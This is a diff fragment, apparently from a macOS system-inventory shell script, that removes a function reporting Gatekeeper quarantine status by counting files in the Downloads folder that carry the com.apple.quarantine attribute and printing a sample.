-    echo "file-quarantine:"
-    echo "  level: system"
-    echo "  service: quarantine"
-    
-    # Check if quarantine is working by examining Downloads folder for quarantine attributes
-    local downloads_dir="$HOME/Downloads"
-    local quarantined_files=0
-    
-    if [ -d "$downloads_dir" ]; then
-        # Count files with quarantine attributes
-        find "$downloads_dir" -type f -exec xattr -l {} \; 2>/dev/null | $CMD_GREP -c "com.apple.quarantine" > /tmp/quarantine_count 2>/dev/null
-        quarantined_files=$(cat /tmp/quarantine_count 2>/dev/null || echo "0")
-        rm -f /tmp/quarantine_count 2>/dev/null
-        
-        echo "    status: active"
-        echo "    quarantined-files: $quarantined_files"
-        echo "    sample-location: $downloads_dir"
-        
-        # Show a sample quarantine attribute if any exist
-        local sample_file=$(find "$downloads_dir" -type f -exec xattr -l {} \; 2>/dev/null | $CMD_GREP -B1 "com.apple.quarantine" | $CMD_HEAD -1 | cut -d: -f1)
-        if [ -n "$sample_file" ]; then
-            echo "    sample-quarantine:"
-            xattr -l "$sample_file" 2>/dev/null | $CMD_GREP "com.apple.quarantine" | while IFS= read -r line; do
-                echo "      attribute: $line"
-            done
-        fi
-    else
-        echo "    status: unknown"
-        echo "    quarantined-files: 0"
-    fi
-}
 
 JOB_ID=$(core_generate_job_id)
 
